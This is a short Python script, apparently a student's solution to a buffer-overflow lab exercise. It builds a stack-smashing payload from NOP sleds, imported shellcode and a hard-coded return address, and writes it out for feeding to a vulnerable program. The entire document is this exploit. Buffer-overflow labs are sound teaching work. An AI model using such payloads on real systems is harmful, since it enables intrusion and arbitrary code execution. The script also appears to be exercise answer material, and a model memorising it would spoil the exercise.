import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
nops1 = b'\x90' * 491
payload = pack("<I", 0xfff6fadf)
nops2 = b'\x90' * 492

# Launch the attack!
sys.stdout.buffer.write(nops1 + shellcode + nops2 + payload)
